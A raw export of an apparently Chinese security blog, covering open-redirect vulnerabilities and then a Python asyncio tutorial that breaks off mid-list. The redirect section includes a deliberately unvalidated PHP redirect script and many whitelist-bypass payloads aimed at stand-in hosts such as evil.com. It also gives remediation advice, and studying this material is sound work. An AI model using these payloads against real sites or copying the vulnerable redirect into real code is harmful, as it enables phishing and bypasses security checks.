class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $p = <span class="string">"/^[0-9a-zA-Z\-\.]+$/"</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match($p,$host) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line">     </span><br><span class="line">$url = <span class="string">"https://www.baidu.com"</span>;</span><br><span class="line">$call_back_url = trim($url);</span><br><span class="line">$call_back_url = encodeUrl(parse_url(urldecode($call_back_url)));</span><br><span class="line">$res = checkUrl($call_back_url, $domainArr);</span><br><span class="line"> </span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="攻击方式及危害性"><a href="#攻击方式及危害性" class="headerlink" title="攻击方式及危害性"></a>攻击方式及危害性</h3><ul>
<li>恶意用户借助URL跳转构造钓鱼页面欺骗其他用户，以及获取敏感信息等，在有在线业务的站点危害较大。</li>
<li>借助URL跳转突破一些基于白名单的安全机制。如：传统的IM对URL的传播进行安全校验，但对于大站点的域名及URL直接允许通过并显示可信的URL，如果该URL中包含恶意跳转可能会导致安全限制被绕过。</li>
<li>基于白名单引用的资源，这种方式与上面的类似。比如：引入youku.com的视频，白名单中检测的时youku.com,如果包含恶意链接还是可能突破限制。</li>
<li>在带referer传输的站点中，就不只会产生任意URL跳转这个问题，同时可能会造成所有基于referer的安全策略失效（比较少见）</li>
</ul>
<h3 id="模拟跨域请求"><a href="#模拟跨域请求" class="headerlink" title="模拟跨域请求"></a>模拟跨域请求</h3><ul>
<li><p>在header头中跳转：（并没有带referer请求，所以这里只会产生任意URL及钓鱼诈骗等）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">	$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	<span class="comment">// 使服务端进行302跳转</span></span><br><span class="line">	header(<span class="string">"Location: $target"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//在JavaScript中跳转</span></span><br><span class="line">	<span class="comment">// echo "&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;";</span></span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">referer.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">	$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">	<span class="keyword">if</span> (strpos($referer, <span class="string">"127.0.0.1:81"</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"referer is true"</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Wrong referer"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"referer is null"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问：<code>http://127.0.0.1:81/url.php?url=http://127.0.0.1:82/referer.php</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542530507.75.png" alt></p>
</li>
<li><p>在js中跳转（带referer传输，除了任意URL跳转漏洞之外还会绕过基于referer的所有安全策略）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542530750.79.png" alt></p>
</li>
</ul>
<h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><ul>
<li>抓取数据包中状态码为302的URL</li>
<li>修改目标地址</li>
<li>查看是否正常跳转（如果不存在直接返回到它自己的域名，如果存在则跳转）</li>
<li>尝试绕过</li>
<li>注意点：协议一致性问题。有些网站校验跳转后的协议必须为HTTPS，有时候无法跳转并不会提示。</li>
</ul>
<h3 id="常见的绕过方式（利用浏览器对URL特性的支持）"><a href="#常见的绕过方式（利用浏览器对URL特性的支持）" class="headerlink" title="常见的绕过方式（利用浏览器对URL特性的支持）"></a>常见的绕过方式（利用浏览器对URL特性的支持）</h3><ol>
<li><p>“@”  （在Firefox中使用会有弹窗提示，其他浏览器没有）</p>
<p><code>http://www.target.com/redirecturl=http://whitelist.com@evil.com</code></p>
</li>
<li><p>“.”</p>
<p><code>http://www.target.com/redirecturl=.eval.com</code></p>
</li>
<li><p>“/”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com/whitelist.com</code></p>
<p><code>http://www.target.com/redirecturl=/http://evil.com</code></p>
</li>
<li><p>“\”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com\a.whitelist.com</code></p>
</li>
<li><p>“\\”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com\\a.whitelist.com</code></p>
</li>
<li><p>“\.”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com\.a.whitelist.com</code></p>
</li>
<li><p>“?”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com?a.whitelist.com</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用问号，这是一个特性，利用问号可以成功绕过URL限制</span><br><span class="line">比如：http://www.aaa.com/acb?Url=http://login.aaa.com 这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：http://www.test.com/?login.aaa.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>“#”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com#a.whitelist.com</code></p>
</li>
<li><p>利用白名单缺陷绕过限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有些域名白名单限制不严格。</span><br><span class="line">1. 检测是否是当前域名</span><br><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com在访问后会跳转到login.aaa.com，如果它的白名单显示不严格，将login.aaa.com改成aaa.com同样可以跳转，到这里都是合法的跳转。这时只要构造一个第三方的域名中包含aaa.com的url就可以成功跳转。如果恰好有这样一个域名，恭喜你；如果没有，就需要买一个域名。emmm..在国内这样很亏</span><br><span class="line"></span><br><span class="line">2.域名字符串检测欺骗</span><br><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com，检测login.aaa.com，直接修改为：http://www.aaa.com/acb?Url=http://login.aaa.com.www.eval.com</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542520860.14.png" alt></p>
</li>
<li><p>利用多重验证&amp;跳转绕过限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">现在的许多网站都有多重验证。例如：在登录账户以后会出现另一个验证，输入手机号进行验证，这时可能存在任意URL跳转的问题。具体如下：</span><br><span class="line">http://www.aaa.com/acb?Url=http:...http://login.aaa.com,这里只需要修改最后的URL来绕过限制</span><br></pre></td></tr></table></figure>
</li>
<li><p>点击触发达到绕过URL跳转的限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在许多的登录的位置，URL是一个跳转的地址。比如：http://www.aaa.com/acb?Url=http://login.aaa.com;这个时候只要将login.aaa.com修改为任意URL;这时界面没有发生变化，当用户输入账号密码点击登录按钮时会触发跳转。</span><br><span class="line">需要注意的是：这里不一定要输入正确的账号密码进行跳转，有些需要，视具体的站点而定</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用xip.io绕过限制（还可以借鉴其余的SSRF绕过方法）</p>
<p><code>http://www.aaa.com/acb?Url=http://login.aaa.com.eval.com.xip.io</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在SSRF读取内网地址的时候会有许多限制，有时候可以利用xip.io直接绕过限制读取，这里可以引用这个方法，直接将可以跳转的位置的地址后添加为任意url+xip.io，如果可以存在则将跳转的地址解析到后面的恶意url进行跳转。</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用超链接绕过可信站点的限制（可信站多次重定向）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如一个存在URL跳转漏洞的位置，在测试的时候一般都喜欢使用www.baidu.com等知名站点去做第三方跳转，但是现在像baidu.com,qq.com这样的可信站点被许多站点默认加在白名单中，所以以这样可信的站点去跳转它并不能触发URL跳转漏洞（这里是网站的正常逻辑）；而别的方式又绕不过，就可以利用下面这个思路：</span><br><span class="line"></span><br><span class="line">1. baidu.com这个域名已经被加在测试站点的白名单中</span><br><span class="line">2. 任意跳转的URL已经被baidu收录</span><br><span class="line">3. site:xxx(任意跳转的URL)</span><br><span class="line">4. 在百度点击相关的站点的时候回利用百度自身的一个302跳转</span><br><span class="line">5. 将百度自身的这个302跳转作为测试站点热任意URL的参数，绕过白名单baidu.com的限制进行任意URL跳转(注意：百度自身的302跳转太长了，可以使用单向压缩函数进行压缩，前提是测试站点能够解析)</span><br><span class="line"></span><br><span class="line">第二种场景：测试站点的白名单限制的比较严格，只允许加在自己域的地址，这时就需要一个测试站点其他域存在任意URL跳转漏洞，才可能利用成功：</span><br><span class="line">https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=eval.com</span><br><span class="line">总结：其实是利用了两次URL跳转</span><br></pre></td></tr></table></figure>
</li>
<li><p>POST方式的URL跳转</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. post方式下的影响较小，比如在站点的个人信息处存在头像上传，上传正常的头像，抓包将头像地址修改为恶意第三方地址，放行以后图片是不能正常显示的，这个时候如果有后台管理员的审核安全意识不高，去查看这个不显示的图片，触发恶意URL跳转，可以打到后台管理员信息。利用条件比较苛刻。在XSS也有类似的利用场景。</span><br><span class="line"></span><br><span class="line">2.如果在POST方式中数据只URL跳转参数，那就可以尝试将POST请求转换为GET请求，配合上面的绕过方式利用。（前提是测试网站支持GET传参的方式）</span><br></pre></td></tr></table></figure>
</li>
<li><p>HPP参数污染绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=l@lsowl.xyz</span><br><span class="line"></span><br><span class="line">跳转会变成： location:http://https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=@lsowl.xyz</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="畸形地址绕过"><a href="#畸形地址绕过" class="headerlink" title="畸形地址绕过"></a>畸形地址绕过</h3><blockquote>
<p>畸形地址由于web站点采用各种各样的语言以及框架，所以绕过的方式显得很诡异。。。</p>
</blockquote>
<ol>
<li><p>通过添加多余的“/”(%2F),然后对%2F二次URL编码绕过网站对.com的分割</p>
<p><code>https://www.aaa.com/%2Fevil/%252Ecom</code> </p>
</li>
<li><p>通过添加4个“/”前缀和“/..”后缀，突破限制(重复特殊字符绕过)</p>
<p><code>https://www.aaa.com/redirect.php?url=////www.eval.com/..</code></p>
</li>
<li><p>特殊字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;;&quot;, &quot;/&quot;, &quot;\&quot;, &quot;?&quot;, &quot;:&quot;, &quot;@&quot;, &quot;=&quot;, &quot;&amp;&quot;, &quot;.&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>协议型网站的实例</p>
<p><code>http://user:pass@testweb.com/path/;help.php?q=abc#lastpage</code></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542522531.03.png" alt></p>
</li>
</ol>
<h3 id="其他绕过思路"><a href="#其他绕过思路" class="headerlink" title="其他绕过思路"></a>其他绕过思路</h3><ol>
<li>跳转参数是IP，而不是域名</li>
<li>跳转到IPV6地址，不是IPV4地址</li>
<li>将要跳转的IP地址用10进制，8进制，16进制表示</li>
<li>更换协议，使用FTP,gopher</li>
<li>CRLF注入不能XSS时，转向利用任意URL跳转漏洞</li>
</ol>
<h3 id="IP地址计算补充（以本地ping百度返回的IP为例）"><a href="#IP地址计算补充（以本地ping百度返回的IP为例）" class="headerlink" title="IP地址计算补充（以本地ping百度返回的IP为例）"></a>IP地址计算补充（以本地ping百度返回的IP为例）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995163.32.png" alt></h3><h4 id="第一种计算方法（将点分十进制转换为32位二进制）"><a href="#第一种计算方法（将点分十进制转换为32位二进制）" class="headerlink" title="第一种计算方法（将点分十进制转换为32位二进制）"></a>第一种计算方法（将点分十进制转换为32位二进制）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995526.11.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995608.55.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995618.84.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995629.62.png" alt></h4><h4 id="第二种计算方法"><a href="#第二种计算方法" class="headerlink" title="第二种计算方法"></a>第二种计算方法</h4><p>111 <em> 256 </em> 256 <em> 256 + 13</em> 256 <em> 256 + 100 </em> 256 +92*1 = 1863148636（十进制）</p>
<h4 id="第三种计算方法（利用mysql中的inet-aton函数）"><a href="#第三种计算方法（利用mysql中的inet-aton函数）" class="headerlink" title="第三种计算方法（利用mysql中的inet_aton函数）"></a>第三种计算方法（利用mysql中的inet_aton函数）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550996163.52.png" alt></h4><h3 id="半自动化测试"><a href="#半自动化测试" class="headerlink" title="半自动化测试"></a>半自动化测试</h3><ul>
<li>开源的payload地址：<a href="https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt" target="_blank" rel="noopener">https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt</a></li>
</ul>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ol>
<li>referer限制<ul>
<li>确定传递URL参数的引入来源，保证URL的有效性，避免恶意用户自己生成的链接(这里要注意的是，在有些特殊的环境下，URL跳转会带着HTTP referer头，这样就会使得依赖referer头验证的方式失效)</li>
</ul>
</li>
<li>进行token验证<ul>
<li>保证所有的链接是可信域中的，加入用户不可控的token在服务端进行验证，防止恶意跳转</li>
</ul>
</li>
<li>服务端做好域名白名单或跳转白名单，只对合法的URL进行跳转（常用）</li>
<li>对请求参数做加密和签名，防止参数被篡改，服务端要能合法正确的解析URL（不常用，多应用在跳转的URL是由后台生产，不是用户在前台输入）</li>
</ol>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.anquanke.com/post/id/94377" target="_blank" rel="noopener">https://www.anquanke.com/post/id/94377</a></p>
<p><a href="https://blog.csdn.net/change518/article/details/54286473" target="_blank" rel="noopener">https://blog.csdn.net/change518/article/details/54286473</a></p>
<p><a href="https://blog.csdn.net/xyx107/article/details/82941842" target="_blank" rel="noopener">https://blog.csdn.net/xyx107/article/details/82941842</a></p>
<p><a href="https://blog.csdn.net/change518/article/details/53997509" target="_blank" rel="noopener">https://blog.csdn.net/change518/article/details/53997509</a></p>
<p><a href="http://www.admintony.com/redict-bypass.html#more" target="_blank" rel="noopener">http://www.admintony.com/redict-bypass.html#more</a></p>
<p><a href="http://www.luteam.com/?p=211#more-211" target="_blank" rel="noopener">http://www.luteam.com/?p=211#more-211</a> [关于IP计算]</p>
<p><a href="http://byd.dropsec.xyz/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</a> [关于SSRF绕过]</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>URL跳转</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>python协程学习</title>
    <url>/2018/11/09/python%E5%8D%8F%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="python学习总结"><a href="#python学习总结" class="headerlink" title="python学习总结"></a>python学习总结</h3><blockquote>
<p>在编写程序处理一些任务时为了提高效率，我们的程序会从单一的串行运行的方式向多线程或者多进程的方式来转变，这里学习总结通过python协程来提高程序运行的效率。多进程适合于CPU密集型的程序（各种循环处理，计数等等），多线程适合I/O密集型的程序（如文件的读取，网络爬虫等），但是由于python的GIL(全局解释器锁)的存在，I/O密集型的程序，效率并没有很大的提升，尤其是python在多CPU中多线程的应用（原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低），所以python对于I/O密集型的任务使用协程可以有效的提升效率。</p>
</blockquote>
<h3 id="相关知识总结"><a href="#相关知识总结" class="headerlink" title="相关知识总结"></a>相关知识总结</h3><h4 id="为什么python多线程比较鸡肋"><a href="#为什么python多线程比较鸡肋" class="headerlink" title="为什么python多线程比较鸡肋"></a>为什么python多线程比较鸡肋</h4><ol>
<li>在python多线程下，每个线程的执行方式：<ul>
<li>获取GIL</li>
<li>执行代码直到sleep或者是python虚拟机将其挂起</li>
<li>释放GIL</li>
</ul>
</li>
<li>可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。</li>
<li>每次释放GIL锁，线程进行锁竞争、切换线程，会消耗资源。并且由于GIL锁存在，python里一个进程永远只能同时执行一个线程(拿到GIL的线程才能执行)</li>
</ol>
<h4 id="多进程是什么，为什么不会像python多线程那样"><a href="#多进程是什么，为什么不会像python多线程那样" class="headerlink" title="多进程是什么，为什么不会像python多线程那样"></a>多进程是什么，为什么不会像python多线程那样</h4><ol>
<li>多进程就是利用 CPU 的多核优势，在同一时间并行地执行多个任务，可以大大提高执行效率。</li>
<li>每个进程有各自独立的GIL，互不干扰，这样就可以真正意义上的并行执行，所以在python中，多进程的执行效率优于多线程(仅仅针对多核CPU而言)</li>
<li>python在多核CPU下做并行的效率提升，通用的就是使用多进程，可以有效的提高并行效率</li>
</ol>
<h4 id="什么是阻塞"><a href="#什么是阻塞" class="headerlink" title="什么是阻塞"></a>什么是阻塞</h4><ol>
<li>阻塞状态指陈程序未得到所需要的计算资源时暂时被挂起的，程序在等待某个操作完成的期间无法进行别的操作的状态。</li>
<li>常见的阻塞形式有：网络 I/O 阻塞、磁盘 I/O 阻塞、用户输入阻塞等。阻塞是无处不在的，包括 CPU 切换上下文时，所有的进程都无法真正干事情，它们也会被阻塞。如果是多核 CPU 则正在执行上下文切换操作的核不可被利用。</li>
</ol>
<h4 id="什么是非阻塞"><a href="#什么是非阻塞" class="headerlink" title="什么是非阻塞"></a>什么是非阻塞</h4><ol>
<li>非阻塞状态指在程序等待某个操作的过程中自身不被阻塞，可以继续进行其他的操作。</li>
<li>非阻塞并不是在任何程序级别、任何情况下都可以存在的。仅当程序封装的级别可以囊括独立的子程序单元时，它才可能存在非阻塞状态。</li>
</ol>
<h4 id="什么是同步"><a href="#什么是同步" class="headerlink" title="什么是同步"></a>什么是同步</h4><ol>
<li>不同的程序在完成某个任务，在执行过程中需要靠某种通信方式协调一致的模式</li>
<li>同步意味着有序</li>
</ol>
<h4 id="什么时异步"><a href="#什么时异步" class="headerlink" title="什么时异步"></a>什么时异步</h4><ol>
<li>不同的程序在完成某个任务，在执行过程中无需通信协调完成任务，不相关的程序单元之间可以是异步的。</li>
<li>异步意味着无序</li>
</ol>
<h4 id="什么是协程"><a href="#什么是协程" class="headerlink" title="什么是协程"></a>什么是协程</h4><ol>
<li>协程，英文叫做 Coroutine，又称微线程，纤程，协程是一种用户态的轻量级线程</li>
<li>协程自身拥有寄存器上下文和栈。协程在调度切换时，将寄存器和栈保存到其他地方，在切换上下文时恢复到原来保存的寄存器上下文和栈。协程可以保存上一次调用的状态，在每次过程的重载时就是进入了上一次调用的状态。</li>
<li>协程本质上是个单进程，协程相对于多进程来说，无需线程上下文切换的开销，无需原子操作锁定及同步的开销，编程模型也非常简单。结合上面来看，除去python的GIL全局解释器锁的问题，协程的上下文切换是在一个进程中不用跨进程，这种模式就决定了它的高效性。</li>
<li>使用协程来实现异步操作，比如在网络爬虫场景下，当一个请求发出后如果有超时的情况，这个时候就不需要一直等待，在这段时间内程序还可以处理许多任务，在请求响应以后切换回来处理，这样可以极大的提升对CPU的利用率，异步协程可以极大的提升我们处理I/O密集型任务的效率。</li>
</ol>
<h3 id="python异步协程的用法"><a href="#python异步协程的用法" class="headerlink" title="python异步协程的用法"></a>python异步协程的用法</h3><blockquote>
<p>python从3.4版本开始引入了协程的概念，是以生成器对象为基础，操作比较繁琐麻烦，在3.5版本引入了在 async/await，是的协程的操作更加简单。这里学习使用python协程中最常用的库 asyncio，这种协程也是基于生成器的，还有一种Gevent，Gevent需要许多第三方库支持。得确保项目中用到其他用到的网络库也必须使用纯Python或者明确说明支持Gevent，由于Gevent直接修改标准库里面大部分的阻塞式系统调用，可能会出现意想不到的问题，所以用asyncio来实现异步协程。</p>
</blockquote>
<h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><ol>
<li>event_loop：事件循环，相当于一个无限循环，我们可以把一些函数注册到这个事件循环上，当满足条件发生的时候，就会调用对应的处理方法。（这里可以理解为一个监听机制）</li>
<li>coroutine：中文翻译叫协程，在 Python 中常指代为协程对象类型，我们可以将协程对象注册到时间循环中，它会被事件循环调用。我们可以使用 async 关键字来定义一个方法，这个方法在调用时不会立即被执行，而是返回一个协程对象。（方便开发者自己调控）</li>
<li>task：任务，它是对协程对象的进一步封装，包含了任务的各个状态。</li>
<li>future：代表将来执行或没有执行的任务的结果，实际上和 task 没有本质区别</li>
<li>async/await 关键字，它是从 Python 3.5 才出现的，专门用于定义协程。其中，async 定义一个协程，await 用来挂起阻塞方法的执行。</li>
</ol>
<h4 id="定义协程"><a href="#定义协程" class="headerlink" title="定义协程"></a>定义协程</h4><ol>
<li><p>只注入简单的coroutine协程对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span>               <span class="comment">#定义一个协程,async定义的协程返回的是一个coroutine协程对象</span></span><br><span class="line">    print(<span class="string">'Number: '</span>,x)</span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine: '</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()     <span class="comment">#创建事件循环loop</span></span><br><span class="line">loop.run_until_complete(coroutine)  <span class="comment">#调用了 loop 对象的 run_until_complete() 方法将协程注册到事件循环 loop中，然后启动</span></span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Coroutine:  &lt;coroutine object execute at <span class="number">0x000001C08233BEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Number:  <span class="number">1</span></span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure>
</li>
<li><p>将 coroutine 对象的进一步封装为task对象，它比 coroutine 对象多了运行状态，比如 running、finished 等，可以用这些状态来获取协程对象的执行情况。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span>  <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">'Number:'</span>,x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"> </span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine:'</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">task = loop.create_task(coroutine)  <span class="comment">#调用loop.create_task将async定义返回的coroutine对象进一步分装</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">loop.run_until_complete(task)       <span class="comment">#调用了loop对象的run_until_complete()方法将协程注册到事件循环 loop中，然后启动</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：这里可以看到task对象的状态</span></span><br><span class="line">Coroutine: &lt;coroutine object execute at <span class="number">0x00000259A21EAEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Task: &lt;Task pending coro=&lt;execute() running at D:/python/实战项目/Coroutie2.py:<span class="number">3</span>&gt;&gt;</span><br><span class="line">Number: <span class="number">1</span></span><br><span class="line">Task: &lt;Task finished coro=&lt;execute() done, defined at D:/python/实战项目/Coroutie2.py:<span class="number">3</span>&gt; result=<span class="number">1</span>&gt;</span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure>
</li>
<li><p>不借助loop的create_task方法进一步封装task对象，通过asyncio 的 ensure_future() 方法直接定义task对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">'Number:'</span>,x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"> </span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine:'</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">task = asyncio.ensure_future(coroutine)   <span class="comment">#直接定义task对象</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task'</span>,task)</span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：和通过loop.create_task封装的结果一样</span></span><br><span class="line">Coroutine: &lt;coroutine object execute at <span class="number">0x000002C99E56AEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Task: &lt;Task pending coro=&lt;execute() running at D:/python/实战项目/Coroutine3.py:<span class="number">3</span>&gt;&gt;</span><br><span class="line">Number: <span class="number">1</span></span><br><span class="line">Task &lt;Task finished coro=&lt;execute() done, defined at D:/python/实战项目/Coroutine3.py:<span class="number">3</span>&gt; result=<span class="number">1</span>&gt;</span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="绑定回调"><a href="#绑定回调" class="headerlink" title="绑定回调"></a>绑定回调</h4><ol>
<li><p>通过调用 add_done_callback() 为task对象绑定一个回调方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span>  <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(task)</span>:</span></span><br><span class="line">    print(<span class="string">'Status:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line">coroutine = Request()</span><br><span class="line">task = asyncio.ensure_future(coroutine)</span><br><span class="line">task.add_done_callback(callback)   <span class="comment">#绑定回调函数</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Task: &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Status: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task: &lt;Task finished coro=&lt;Request() done, defined at D:/python/实战项目/Coroutine4.py:<span class="number">4</span>&gt; result=&lt;Response [<span class="number">200</span>]&gt;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>不用回调方法，直接在 task 运行完毕之后也可以直接调用 result() 方法获取结果</p>
